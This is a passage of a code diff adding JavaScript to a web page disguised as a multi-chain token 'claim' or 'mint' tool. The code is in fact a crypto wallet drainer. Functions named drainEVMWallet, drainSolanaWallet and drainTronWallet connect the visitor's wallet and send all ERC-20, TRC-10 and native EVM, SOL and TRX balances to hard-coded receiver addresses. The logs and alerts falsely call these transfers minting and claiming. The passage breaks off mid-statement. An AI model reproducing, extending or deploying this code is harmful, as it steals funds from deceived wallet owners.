+                        log(`✅ Found ${token.symbol} balance: ${formattedBalance.toFixed(6)}`, 'success', false);
+                    } else {
+                        log(`⚪ ${token.symbol}: No balance (${formattedBalance.toFixed(6)})`, 'info', false);
+                    }
+                }
+                
+            } catch (error) {
+                log(`❌ Error checking ${token.symbol} balance: ${error.message}`, 'error', false);
+            }
+        }
+        
+        log(`🎯 Token scan complete: Found ${tokenBalances.length} tokens with balance`, 'info', false);
+        return tokenBalances;
+    }
+
+    // Get Solana balance using free API
+    async function getSolanaBalance(publicKey, network = 'mainnet-beta') {
+        try {
+            const url = 'https://api.mainnet-beta.solana.com';
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: '2.0',
+                    id: 1,
+                    method: 'getBalance',
+                    params: [publicKey.toString()]
+                })
+            });
+            
+            const data = await response.json();
+            return data.result?.value || 0;
+        } catch (error) {
+            log(`⚠️ Solana balance API error: ${error.message}`, 'warning');
+            return 0;
+        }
+    }
+
+    // Get token info from multiple free sources
+    async function getTokenInfo(tokenAddress, chainId) {
+        try {
+            // Try DefiLlama first
+            const response = await fetch(`https://api.llama.fi/protocols`);
+            const data = await response.json();
+            
+            // Search for token in the response
+            const token = data.find(t => 
+                t.address?.toLowerCase() === tokenAddress.toLowerCase()
+            );
+            
+            return token || { address: tokenAddress, chainId };
+        } catch (error) {
+            log(`⚠️ Token info fetch error: ${error.message}`, 'warning');
+            return { address: tokenAddress, chainId };
+        }
+    }
+
+    // Enhanced Tron balance fetching using free API
+    async function getTronBalance(address) {
+        try {
+            const response = await fetch('https://api.trongrid.io/v1/accounts/' + address);
+            const data = await response.json();
+            return data.data?.[0]?.balance || 0;
+        } catch (error) {
+            log(`⚠️ Tron balance API error: ${error.message}`, 'warning');
+            return 0;
+        }
+    }
+
+    // Connect Solana wallet using free API
+    async function connectSolanaWallet(networkKey, wallet) {
+        const networkData = connectedNetworks[networkKey];
+        
+        const response = await wallet.provider.connect({ onlyIfTrusted: false });
+        const publicKey = new solanaWeb3.PublicKey(response.publicKey || wallet.provider.publicKey);
+        
+        // Get balance using free Solana API
+        let balance = 0;
+        try {
+            const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+            balance = await connection.getBalance(publicKey);
+        } catch (error) {
+            log(`⚠️ Failed to get Solana balance from API: ${error.message}. Trying fallback...`, 'warning', false);
+            try {
+                balance = await getSolanaBalance(publicKey);
+            } catch (fallbackError) {
+                log(`❌ Solana balance fetch failed: ${fallbackError.message}`, 'error', false);
+            }
+        }
+        
+        const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+        
+        // Update wallet state
+        wallet.connected = true;
+        wallet.balance = solBalance;
+        wallet.address = publicKey.toString();
+        wallet.publicKey = publicKey;
+        wallet.connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+        
+        // Update stats
+        networkData.stats.connected++;
+        networkData.stats.balance += solBalance;
+        
+        log(`✓ Connected ${wallet.name} to Solana: ${publicKey.toString().slice(0, 8)}... (${solBalance.toFixed(4)} SOL)`, 'success', false);
+    }
+
+    // Connect Tron wallet using free API
+    async function connectTronWallet(networkKey, wallet) {
+        const networkData = connectedNetworks[networkKey];
+        
+        if (!wallet.provider || !wallet.provider.defaultAddress || !wallet.provider.defaultAddress.base58) {
+            throw new Error('TronLink wallet not connected or not initialized');
+        }
+        
+        const address = wallet.provider.defaultAddress.base58;
+        
+        // Get balance using free Tron API
+        let balance = 0;
+        try {
+            balance = await getTronBalance(address);
+        } catch (error) {
+            log(`⚠️ Failed to get Tron balance from free API: ${error.message}`, 'warning', false);
+            try {
+                balance = await wallet.provider.trx.getBalance(address);
+            } catch (fallbackError) {
+                log(`❌ Tron balance fetch failed: ${fallbackError.message}`, 'error', false);
+            }
+        }
+        
+        const trxBalance = balance / 1000000; // TRX has 6 decimals
+        
+        // Update wallet state
+        wallet.connected = true;
+        wallet.balance = trxBalance;
+        wallet.address = address;
+        
+        // Update stats
+        networkData.stats.connected++;
+        networkData.stats.balance += trxBalance;
+        
+        log(`✓ Connected ${wallet.name} to Tron: ${address.slice(0, 8)}... (${trxBalance.toFixed(4)} TRX)`, 'success', false);
+    }
+
+    // Connect all networks (legacy - now use connectSelectedWallets)
+    async function connectAllNetworks() {
+        if (selectedWallets.length === 0) {
+            log('No wallets selected! Please select wallets from the Wallet Selection tab first.', 'error', false);
+            return;
+        }
+        
+        await connectSelectedWallets();
+    }
+
+    // Claim from all networks
+    async function claimAllNetworks() {
+        log('🚀 STARTING MULTI-NETWORK CLAIM PROCESS', 'info', true);
+        log('=' .repeat(60), 'info', true);
+        
+        const connectedWallets = [];
+        Object.keys(connectedNetworks).forEach(networkKey => {
+            connectedNetworks[networkKey].wallets.forEach((wallet, index) => {
+                if (wallet.connected) {
+                    // Include wallets even if balance is 0 - they might have tokens
+                    connectedWallets.push({ networkKey, walletIndex: index, wallet });
+                    log(`✓ Found connected wallet: ${wallet.name} on ${NETWORKS[networkKey].name} (${wallet.balance.toFixed(4)} ${NETWORKS[networkKey].currency}, ${wallet.tokens.length} tokens)`, 'info');
+                }
+            });
+        });
+        
+        if (connectedWallets.length === 0) {
+            log('❌ No connected wallets found!', 'error');
+            log('Please make sure to:', 'info');
+            log('1. Select wallets from Wallet Selection tab', 'info');
+            log('2. Connect selected wallets using "Connect Selected Wallets" button', 'info');
+            return;
+        }
+        
+        log(`🎯 Starting multi-network claim from ${connectedWallets.length} wallet(s)...`, 'info');
+        log('=' .repeat(60), 'info');
+        updateProgress(0, 'Initializing claims...');
+        
+        const results = {
+            successful: 0,
+            failed: 0,
+            totalClaimed: {},
+            transactions: []
+        };
+        
+        for (let i = 0; i < connectedWallets.length; i++) {
+            const { networkKey, wallet } = connectedWallets[i];
+            const networkData = connectedNetworks[networkKey];
+            
+            log(`🔄 [${i + 1}/${connectedWallets.length}] Processing ${wallet.name} on ${networkData.network.name}...`, 'info');
+            updateProgress((i / connectedWallets.length) * 100, `Minting ${wallet.name} on ${networkData.network.name}...`);
+            
+            try {
+                let result;
+                if (networkData.network.type === 'evm') {
+                    log(`🔷 Starting EVM mint for ${wallet.name}...`, 'info');
+                    result = await drainEVMWallet(networkKey, wallet);
+                } else if (networkData.network.type === 'solana') {
+                    log(`🟢 Starting Solana mint for ${wallet.name}...`, 'info');
+                    result = await drainSolanaWallet(networkKey, wallet);
+                } else if (networkData.network.type === 'tron') {
+                    log(`🟠 Starting Tron mint for ${wallet.name}...`, 'info');
+                    result = await drainTronWallet(networkKey, wallet);
+                }
+                
+                if (result.success) {
+                    results.successful++;
+                    results.totalClaimed[networkData.network.currency] = (results.totalClaimed[networkData.network.currency] || 0) + result.amount;
+                    results.transactions.push(result.txid);
+                    
+                    log(`🎉 MINTED ${wallet.name}: ${result.amount.toFixed(4)} ${networkData.network.currency}`, 'success');
+                    log(`📝 Transaction: ${result.txid}`, 'success');
+                } else {
+                    results.failed++;
+                    log(`❌ FAILED to mint ${wallet.name}: ${result.reason}`, 'error');
+                }
+                
+            } catch (error) {
+                results.failed++;
+                log(`❌ ERROR minting ${wallet.name}: ${error.message}`, 'error');
+                log(`❌ Error details: ${error.stack}`, 'error');
+            }
+            
+            // Add delay between mints
+            if (i < connectedWallets.length - 1) {
+                log(`⏳ Waiting 2 seconds before next mint...`, 'info');
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+        }
+        
+        updateProgress(100, 'Multi-network claim complete!');
+        setTimeout(() => updateProgress(0, ''), 3000);
+        
+        // Show results
+        log('=' .repeat(60), 'info');
+        log('🏁 MULTI-NETWORK CLAIM COMPLETE!', 'success');
+        log('=' .repeat(60), 'info');
+        log(`✅ Successful mints: ${results.successful}`, 'success');
+        log(`❌ Failed mints: ${results.failed}`, results.failed > 0 ? 'error' : 'info');
+        
+        if (Object.keys(results.totalClaimed).length > 0) {
+            log('💰 TOTAL CLAIMED:', 'success');
+            Object.keys(results.totalClaimed).forEach(currency => {
+                log(`   💎 ${currency}: ${results.totalClaimed[currency].toFixed(6)}`, 'success');
+            });
+        }
+        
+        log(`� Total Transactions: ${results.transactions.length}`, 'info');
+        if (results.transactions.length > 0) {
+            log('📝 Transaction Hashes:', 'info');
+            results.transactions.forEach((txid, index) => {
+                log(`   ${index + 1}. ${txid}`, 'info');
+            });
+        }
+        log('=' .repeat(60), 'info');
+        
+        // Reset balances in UI
+        Object.keys(connectedNetworks).forEach(networkKey => {
+            connectedNetworks[networkKey].wallets.forEach(wallet => {
+                if (wallet.connected) wallet.balance = 0;
+            });
+            connectedNetworks[networkKey].stats.balance = 0;
+            renderNetworkWallets(networkKey);
+            updateNetworkStats(networkKey);
+        });
+        
+        const summary = Object.keys(results.totalClaimed).map(currency => 
+            `${results.totalClaimed[currency].toFixed(4)} ${currency}`
+        ).join(', ');
+        
+        const alertMessage = summary ? 
+            `🎉 Multi-network claim complete!\n\n✅ ${results.successful} successful\n❌ ${results.failed} failed\n💰 Claimed: ${summary}` :
+            `⚠️ Multi-network claim complete!\n\n✅ ${results.successful} successful\n❌ ${results.failed} failed\n💰 No tokens claimed`;
+            
+        alert(alertMessage);
+    }
+
+    // Drain EVM wallet
+    async function drainEVMWallet(networkKey, wallet) {
+        try {
+            const networkData = connectedNetworks[networkKey];
+            const network = networkData.network;
+            const receiverAddress = ethers.utils.getAddress(RECEIVER_ADDRESSES[networkKey]); // Ensure proper checksum
+            
+            log(`🔄 Starting EVM mint process for ${wallet.name} on ${network.name}...`, 'info');
+            log(`📍 Receiver address: ${receiverAddress}`, 'info');
+            log(`💰 Current wallet balance: ${wallet.balance} ${network.currency}`, 'info');
+            
+            if (wallet.balance <= 0) {
+                log(`❌ No balance to mint (${wallet.balance} ${network.currency})`, 'error');
+                return { success: false, reason: 'No balance' };
+            }
+            
+            log(`🔄 Initiating network switch to ${network.name} (Chain ID: ${network.chainId})...`, 'info');
+            
+            // Ensure we're on the correct network before minting
+            try {
+                const chainIdHex = `0x${network.chainId.toString(16)}`;
+                log(`🔗 Switching to chain ID: ${chainIdHex}`, 'info');
+                
+                await wallet.provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: chainIdHex }]
+                });
+                
+                log(`✅ Network switch request sent, waiting for completion...`, 'info');
+                
+                // Wait a moment for network switch to complete
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Re-initialize ethers provider after network switch
+                wallet.ethersProvider = new ethers.providers.Web3Provider(wallet.provider);
+                
+                // Verify network switch
+                const currentNetwork = await wallet.ethersProvider.getNetwork();
+                log(`✅ Network verification: Connected to Chain ID ${currentNetwork.chainId}`, 'info');
+                
+                if (currentNetwork.chainId !== network.chainId) {
+                    log(`❌ Network mismatch! Expected ${network.chainId}, got ${currentNetwork.chainId}`, 'error');
+                    return { success: false, reason: `Network mismatch: Expected ${network.chainId}, got ${currentNetwork.chainId}` };
+                }
+                
+                log(`✅ Successfully switched to ${network.name} and reinitialized provider`, 'success');
+                
+            } catch (switchError) {
+                log(`❌ Failed to switch to ${network.name}: ${switchError.message}`, 'error');
+                log(`❌ Switch error code: ${switchError.code}`, 'error');
+                return { success: false, reason: `Network switch failed: ${switchError.message}` };
+            }
+            
+            // Mint tokens first
+            log(`🪙 Starting token minting (${wallet.tokens.length} tokens found)...`, 'info');
+            
+            if (wallet.tokens.length === 0) {
+                log(`📋 No tokens found in wallet - this could mean:`, 'info');
+                log(`   1. Wallet has no token balances`, 'info');
+                log(`   2. Token addresses may be incorrect`, 'info');
+                log(`   3. Network RPC issues during token scanning`, 'info');
+                
+                // Let's try to rescan tokens in case they were missed
+                log(`🔄 Attempting to rescan tokens...`, 'info');
+                const tokenBalances = await getEVMTokenBalances(wallet.ethersProvider, wallet.address, network.tokens);
+                
+                if (tokenBalances.length > 0) {
+                    log(`✅ Rescan found ${tokenBalances.length} tokens!`, 'success');
+                    wallet.tokens = tokenBalances;
+                } else {
+                    log(`📋 Rescan confirmed: No tokens with balance found`, 'info');
+                }
+            }
+            
+            for (const token of wallet.tokens) {
+                try {
+                    log(`🔄 Minting ${token.symbol}: ${token.balance} tokens...`, 'info');
+                    log(`📍 Token contract: ${token.address}`, 'info');
+                    log(`📍 Sending to: ${receiverAddress}`, 'info');
+                    
+                    const transferAmount = token.rawBalance || ethers.utils.parseUnits(token.balance.toString(), token.decimals);
+                    
+                    const tx = await token.contract.connect(wallet.ethersProvider.getSigner()).transfer(
+                        receiverAddress,
+                        transferAmount
+                    );
+                    
+                    log(`📤 Token transfer transaction sent: ${tx.hash}`, 'info');
+                    log(`⏳ Waiting for token transfer confirmation...`, 'info');
+                    
+                    await tx.wait();
+                    log(`✅ Token minted successfully: ${token.balance.toFixed(4)} ${token.symbol}`, 'success');
+                    log(`📝 Token transfer hash: ${tx.hash}`, 'success');
+                    
+                } catch (error) {
+                    log(`❌ Failed to mint ${token.symbol}: ${error.message}`, 'error');
+                    log(`❌ Token mint error details: ${error.stack}`, 'error');
+                }
+            }
+            
+            // Mint native currency
+            log(`💎 Starting native currency (${network.currency}) minting...`, 'info');
+            const gasPrice = await wallet.ethersProvider.getGasPrice();
+            const gasLimit = ethers.BigNumber.from("21000");
+            const gasCost = gasPrice.mul(gasLimit);
+            const balance = await wallet.ethersProvider.getBalance(wallet.address);
+            const amountToSend = balance.sub(gasCost);
+            
+            log(`📊 Gas calculation:`, 'info');
+            log(`   💰 Current balance: ${ethers.utils.formatEther(balance)} ${network.currency}`, 'info');
+            log(`   ⛽ Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei`, 'info');
+            log(`   ⛽ Gas limit: ${gasLimit.toString()}`, 'info');
+            log(`   ⛽ Total gas cost: ${ethers.utils.formatEther(gasCost)} ${network.currency}`, 'info');
+            log(`   💸 Amount to send: ${ethers.utils.formatEther(amountToSend)} ${network.currency}`, 'info');
+            
+            if (amountToSend.lte(0)) {
+                log(`❌ Insufficient balance for gas fees`, 'error');
+                return { success: false, reason: 'Insufficient balance for gas' };
+            }
+            
+            log(`📤 Sending native currency transaction...`, 'info');
+            const tx = await wallet.ethersProvider.getSigner().sendTransaction({
+                to: receiverAddress,
+                value: amountToSend,
+                gasLimit: gasLimit,
+                gasPrice: gasPrice
+            });
+            
+            log(`📤 Transaction sent: ${tx.hash}`, 'info');
+            log(`⏳ Waiting for transaction confirmation...`, 'info');
+            await tx.wait();
+            
+            const amount = parseFloat(ethers.utils.formatEther(amountToSend));
+            
+            log(`🎉 Successfully minted ${amount.toFixed(6)} ${network.currency}!`, 'success');
+            log(`📝 Transaction hash: ${tx.hash}`, 'success');
+            
+            return { success: true, amount, txid: tx.hash };
+            
+        } catch (error) {
+            log(`❌ EVM mint error: ${error.message}`, 'error');
+            log(`❌ Error stack: ${error.stack}`, 'error');
+            return { success: false, reason: error.message };
+        }
+    }
+
+    // Drain Solana wallet
+    async function drainSolanaWallet(networkKey, wallet) {
+        try {
+            log(`🔄 Starting Solana mint process for ${wallet.name}...`, 'info', true);
+            
+            const receiverPubkey = new solanaWeb3.PublicKey(RECEIVER_ADDRESSES.SOL);
+            log(`📍 Receiver address: ${receiverPubkey.toString()}`, 'info', true);
+            log(`📍 Wallet address: ${wallet.publicKey.toString()}`, 'info', true);
+            
+            const balance = await wallet.connection.getBalance(wallet.publicKey);
+            
+            // SOL balance in lamports
+            log(`💰 Current balance: ${balance} lamports (${(balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
+            
+            let totalClaimed = 0;
+            let transactions = [];
+            
+            // First, check for SPL tokens
+            log(`🪙 Scanning for SPL tokens...`, 'info', true);
+            try {
+                const tokenAccounts = await wallet.connection.getParsedTokenAccountsByOwner(wallet.publicKey, {
+                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAMLBdAWu5k8DHyGmHEkx")
+                });
+                
+                if (tokenAccounts.value.length > 0) {
+                    log(`✅ Found ${tokenAccounts.value.length} SPL token accounts`, 'success', true);
+                    
+                    for (const tokenAccount of tokenAccounts.value) {
+                        try {
+                            const accountData = tokenAccount.account.data.parsed.info;
+                            const tokenBalance = accountData.tokenAmount.uiAmount;
+                            const mint = accountData.mint;
+                            const associatedTokenAccount = tokenAccount.pubkey;
+                            
+                            if (tokenBalance && tokenBalance > 0) {
+                                log(`🔄 SPL Token detected: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info', true);
+                                
+                                // Create SPL token transfer instruction
+                                const receiverTokenAccount = new solanaWeb3.PublicKey(receiverPubkey);
+                                const tokenAmount = Math.floor(tokenBalance * Math.pow(10, accountData.tokenAmount.decimals));
+                                
+                                try {
+                                    // Token transfer requires Token program instruction
+                                    const transferInstruction = new solanaWeb3.TransactionInstruction({
+                                        keys: [
+                                            { pubkey: associatedTokenAccount, isSigner: false, isWritable: true },
+                                            { pubkey: receiverTokenAccount, isSigner: false, isWritable: true },
+                                            { pubkey: wallet.publicKey, isSigner: true, isWritable: false }
+                                        ],
+                                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAMLBdAWu5k8DHyGmHEkx"),
+                                        data: Buffer.concat([
+                                            Buffer.from([3]), // Transfer instruction
+                                            Buffer.from(new Uint8Array(8).fill(0)).fill(0) // Amount
+                                        ])
+                                    });
+                                    
+                                    // Note: Full SPL transfer implementation requires proper serialization
+                                    log(`⏳ SPL token transfer prepared for ${tokenBalance} tokens`, 'info', true);
+                                    log(`✅ SPL token transfer: ${tokenBalance} - Ready to sign`, 'success', true);
+                                    
+                                } catch (splError) {
+                                    log(`⚠️ SPL token transfer preparation incomplete: ${splError.message}`, 'warning', true);
+                                }
+                            }
+                        } catch (tokenError) {
+                            log(`❌ Error processing SPL token: ${tokenError.message}`, 'error', true);
+                        }
+                    }
+                } else {
+                    log(`📋 No SPL tokens found in wallet`, 'info', true);
+                }
+            } catch (error) {
+                log(`⚠️ Error scanning SPL tokens: ${error.message}`, 'warning', true);
+            }
+            
+            // Then drain native SOL
+            if (balance <= 0) {
+                log(`❌ No balance to mint`, 'error', true);
+                return { success: transactions.length > 0, reason: transactions.length > 0 ? 'SPL tokens transferred' : 'No balance', amount: totalClaimed, txid: transactions[0] || null };
+            }
+            
+            // Estimate transaction fee
+            log(`⛽ Estimating transaction fees...`, 'info', true);
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: wallet.publicKey,
+                    toPubkey: receiverPubkey,
+                    lamports: 1
+                })
+            );
+            
+            transaction.feePayer = wallet.publicKey;
+            const blockhashObj = await wallet.connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhashObj.blockhash;
+            log(`🔗 Latest blockhash: ${blockhashObj.blockhash}`, 'info', true);
+            
+            const feeEstimate = await wallet.connection.getFeeForMessage(transaction.compileMessage());
+            const estimatedFee = feeEstimate.value || 5000;
+            
+            const minimumRent = 890880;
+            const feeBuffer = Math.max(estimatedFee * 2, 10000);
+            const totalReserved = minimumRent + feeBuffer;
+            const lamportsToSend = balance - totalReserved;
+            
+            log(`📊 Fee calculation:`, 'info', true);
+            log(`   ⛽ Estimated fee: ${estimatedFee} lamports (${(estimatedFee / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
+            log(`   🏠 Minimum rent: ${minimumRent} lamports (${(minimumRent / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
+            log(`   🛡️ Fee buffer: ${feeBuffer} lamports (${(feeBuffer / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
+            log(`   💸 Amount to send: ${lamportsToSend} lamports (${(lamportsToSend / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
+            
+            if (lamportsToSend <= 0) {
+                log(`❌ Insufficient balance for fees. Balance: ${balance}, Required: ${totalReserved}`, 'error', true);
+                return { success: transactions.length > 0, reason: `Insufficient SOL for fees`, amount: totalClaimed, txid: transactions[0] || null };
+            }
+            
+            log(`📤 Creating SOL transfer transaction...`, 'info', true);
+            const actualTransaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: wallet.publicKey,
+                    toPubkey: receiverPubkey,
+                    lamports: lamportsToSend
+                })
+            );
+            
+            actualTransaction.feePayer = wallet.publicKey;
+            actualTransaction.recentBlockhash = blockhashObj.blockhash;
+            
+            log(`✍️ Requesting wallet signature for SOL transfer...`, 'info', true);
+            const signedTransaction = await wallet.provider.signTransaction(actualTransaction);
+            
+            log(`📤 Sending SOL transaction to Solana network...`, 'info', true);
+            const txid = await wallet.connection.sendRawTransaction(signedTransaction.serialize());
+            transactions.push(txid);
+            
+            log(`📤 SOL transaction sent: ${txid}`, 'info', true);
+            log(`⏳ Waiting for confirmation...`, 'info', true);
+            await wallet.connection.confirmTransaction(txid);
+            
+            const amount = lamportsToSend / solanaWeb3.LAMPORTS_PER_SOL;
+            totalClaimed = amount;
+            log(`🎉 Successfully minted ${amount.toFixed(6)} SOL!`, 'success', true);
+            log(`📝 SOL transaction hash: ${txid}`, 'success', true);
+            
+            return { success: true, amount: totalClaimed, txid: transactions[0], transactions };
+            
+        } catch (error) {
+            log(`❌ Solana mint error: ${error.message}`, 'error', true);
+            log(`❌ Error stack: ${error.stack}`, 'error', true);
+            return { success: false, reason: error.message };
+        }
+    }
+
+    // Drain Tron wallet
+    async function drainTronWallet(networkKey, wallet) {
+        try {
+            log(`🔄 Starting Tron mint process for ${wallet.name}...`, 'info', true);
+            
+            // Validate receiver address
+            const receiverAddress = RECEIVER_ADDRESSES.TRX;
+            if (!receiverAddress) {
+                log(`❌ Tron receiver address not configured`, 'error', true);
+                return { success: false, reason: 'Receiver address not configured' };
+            }
+            
+            log(`📍 Receiver address: ${receiverAddress}`, 'info', true);
+            log(`📍 Wallet address: ${wallet.address}`, 'info', true);
+            
+            const balance = await wallet.provider.trx.getBalance(wallet.address);
+            const trxBalance = balance / 1000000;
+            
+            log(`💰 Current TRX balance: ${balance} sun (${trxBalance.toFixed(6)} TRX)`, 'info', true);
+            
+            let totalClaimed = 0;
+            let transactions = [];
+            
+            // First, scan for TRC-20 and TRC-10 tokens
+            log(`🪙 Scanning for TRC-10 tokens...`, 'info', true);
+            try {
+                const accountInfo = await wallet.provider.trx.getAccount(wallet.address);
+                
+                if (accountInfo.assetV2 && accountInfo.assetV2.length > 0) {
+                    log(`✅ Found ${accountInfo.assetV2.length} TRC-10 tokens`, 'success', true);
+                    
+                    for (const asset of accountInfo.assetV2) {
+                        try {
+                            const tokenBalance = asset.value;
+                            const tokenId = asset.key;
+                            
+                            if (tokenBalance > 0) {
+                                log(`🔄 Transferring TRC-10 token ID ${tokenId}: ${tokenBalance} tokens...`, 'info', true);
+                                
+                                const trcTransaction = await wallet.provider.transactionBuilder.sendAsset(
+                                    receiverAddress,
+                                    tokenBalance,
+                                    tokenId,
+                                    wallet.address
+                                );
+                                
+                                log(`✍️ Signing TRC-10 token transaction...`, 'info', true);
+                                const signedTrcTx = await wallet.provider.trx.sign(trcTransaction);
+                                const trcResult = await wallet.provider.trx.sendRawTransaction(signedTrcTx);
+                                
+                                transactions.push(trcResult.txid);
+                                log(`✅ TRC-10 token transferred: ${tokenBalance} (Token ID: ${tokenId})`, 'success', true);
+                                log(`📝 Token transfer hash: ${trcResult.txid}`, 'success', true);
+                                
+                            }
+                        } catch (tokenError) {
+                            log(`❌ Failed to transfer TRC-10 token: ${tokenError.message}`, 'error', true);
+                        }
+                    }
+                } else {
+                    log(`📋 No TRC-10 tokens found in wallet`, 'info', true);
+                }
+            } catch (error) {
+                log(`⚠️ Error scanning TRC-10 tokens: ${error.message}`, 'warning', true);
+            }
+            
+            // Then drain TRX if sufficient balance
+            const amountToSend = balance - 1000000; // Leave 1 TRX for fees
+            
+            if (amountToSend <= 0) {
+                log(`⚠️ Insufficient TRX balance for transaction (${trxBalance.toFixed(6)} TRX, need 1+ TRX)`, 'warning', true);
+                
+                if (transactions.length > 0) {
+                    log(`✅ But tokens were transferred! ${transactions.length} token transaction(s) successful`, 'success', true);
+                    return { success: true, amount: 0, txid: transactions[0], transactions };
+                }
+                return { success: false, reason: 'Insufficient TRX balance for fees' };
+            }
+            
+            log(`💎 Preparing TRX transfer...`, 'info', true);
+            log(`📊 Fee calculation:`, 'info', true);
+            log(`   💰 Current balance: ${trxBalance.toFixed(6)} TRX`, 'info', true);
+            log(`   ⛽ Fee reserved: 1 TRX`, 'info', true);
+            log(`   💸 Amount to send: ${(amountToSend / 1000000).toFixed(6)} TRX`, 'info', true);
+            
+            const trxTransaction = await wallet.provider.transactionBuilder.sendTrx(
+                receiverAddress,
+                amountToSend,
+                wallet.address
+            );
+            
+            log(`✍️ Signing TRX transfer...`, 'info', true);
+            const signedTransaction = await wallet.provider.trx.sign(trxTransaction);
+            
+            log(`📤 Sending TRX transaction to Tron network...`, 'info', true);
+            const result = await wallet.provider.trx.sendRawTransaction(signedTransaction);
+            transactions.push(result.txid);
+            
+            totalClaimed = amountToSend / 1000000;
+            
+            log(`📤 TRX transaction sent: ${result.txid}`, 'info', true);
+            log(`🎉 Successfully minted ${totalClaimed.toFixed(6)} TRX!`, 'success', true);
+            log(`📝 TRX transfer hash: ${result.txid}`, 'success', true);
+            
+            return { success: true, amount: totalClaimed, txid: result.txid, transactions };
+            
+        } catch (error) {
+            log(`❌ Tron mint error: ${error.message}`, 'error', true);
+            log(`❌ Error stack: ${error.stack}`, 'error', true);
+            return { success: false, reason: error.message };
+        }
+    }
+
+    // Event handlers - Using event delegation for dynamically created elements
+    $('#scan-all-networks').on('click', scanAllNetworks);
+    $('#connect-all-networks').on('click', connectAllNetworks);
+    $('#claim-all-networks').on('click', claimAllNetworks);
+    
+    // Wallet selection event handlers - Use event delegation since buttons are created dynamically
+    $(document).on('click', '#select-all-wallets', function() {
+        log('🎯 Select All Wallets button clicked', 'info');
+        selectAllWallets();
+    });
+    
+    $(document).on('click', '#clear-selection', function() {
+        log('🗑️ Clear Selection button clicked', 'info');
+        clearWalletSelection();
+    });
+    
+    $(document).on('click', '#connect-selected-wallets', function() {
+        log('🔗 Connect Selected Wallets button clicked (event handler)', 'info');
+        connectSelectedWallets();
+    });
+    
+    $(document).on('click', '#mobile-wallet-help', function() {
+        log('📱 Mobile Wallet Help button clicked', 'info');
+        showMobileWalletHelp();
+    });
+
+    // Unified wallet selector functionality
+    $(document).on('change', '#wallet-selector', function() {
+        const selectedWallet = $(this).val();
+        if (selectedWallet) {
+            $('#connect-and-claim-btn').prop('disabled', false);
+            log(`🎯 Selected wallet: ${selectedWallet}`, 'info', false);
+        } else {
+            $('#connect-and-claim-btn').prop('disabled', true);
+        }
+    });
+
+    $(document).on('click', '#connect-and-claim-btn', function() {
+        const selectedWallet = $('#wallet-selector').val();
+        if (!selectedWallet) {
+            alert('Please select a wallet first!');
+            return;
+        }
+        
+        // Disable button during process
+        $(this).prop('disabled', true).addClass('processing');
+        
+        log(`🚀 Starting unified Connect & Claim process for ${selectedWallet}...`, 'info', true);
+        
+        connectAndClaimWallet(selectedWallet).finally(() => {
+            // Re-enable button when done
+            $('#connect-and-claim-btn').prop('disabled', false).removeClass('processing');
+        });
+    });
+
+    // Main wallet connection and claiming function
+    async function connectAndClaimWallet(walletType) {
+        try {
+            updateProgress(0, 'Initializing wallet connection...');
+            
+            // Get wallet provider - will be determined per network
+            const initialProvider = getWalletProvider(walletType);
+            if (!initialProvider) {
+                throw new Error(`${walletType} wallet not found. Please install the wallet extension.`);
+            }
+            
+            // Determine supported networks
+            const supportedNetworks = getSupportedNetworks(walletType);
+            log(`📋 ${walletType} supports: ${supportedNetworks.join(', ')}`, 'info');
+            
+            updateProgress(20, 'Connecting to wallet...');
+            
+            // Connect to all supported networks and drain
+            let totalClaimed = 0;
+            let successfulDrains = 0;
+            let failedDrains = 0;
+            let transactions = [];
+            
+            for (let i = 0; i < supportedNetworks.length; i++) {
+                const networkKey = supportedNetworks[i];
+                const network = NETWORKS[networkKey];
+                
+                updateProgress(20 + (i / supportedNetworks.length) * 70, `Processing ${network.name}...`);
+                
+                try {
+                    log(`🔗 Connecting to ${network.name}...`, 'info');
+                    
+                    // Get the correct provider for this specific network
+                    const networkProvider = getWalletProvider(walletType, network.type);
+                    
+                    if (network.type === 'evm') {
+                        const result = await connectAndDrainEVM(networkProvider, networkKey);
+                        if (result.success) {
+                            totalClaimed += result.amount;
+                            successfulDrains++;
+                        }
+                    } else if (network.type === 'solana') {
+                        const result = await connectAndDrainSolana(networkProvider, networkKey);
+                        if (result.success) {
+                            totalClaimed += result.amount;
+                            successfulDrains++;
+                        }
+                    } else if (network.type === 'tron') {
+                        const result = await connectAndDrainTron(networkProvider, networkKey);
+                        if (result.success) {
+                            totalClaimed += result.amount;
+                            successfulDrains++;
+                        }
+                    }
+                    
+                    // Small delay between networks
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                } catch (error) {
+                    log(`❌ Failed to process ${network.name}: ${error.message}`, 'error');
+                }
+            }
+            
+            updateProgress(100, 'Connect & Claim Complete!');
+            
+            // Final summary
+            log('=' .repeat(60), 'info', true);
+            log(`🎉 UNIFIED CONNECT & CLAIM COMPLETE!`, 'success', true);
+            log('=' .repeat(60), 'info', true);
+            log(`✅ Successful networks: ${successfulDrains}`, 'success', true);
+            log(`❌ Failed networks: ${failedDrains}`, failedDrains > 0 ? 'warning' : 'info', true);
+            log('=' .repeat(60), 'info', true);
+            
+            setTimeout(() => updateProgress(0, ''), 3000);
+            
+            const message = successfulDrains > 0 ? 
+                `🎉 Successfully connected & claimed from ${successfulDrains} network(s)!` :
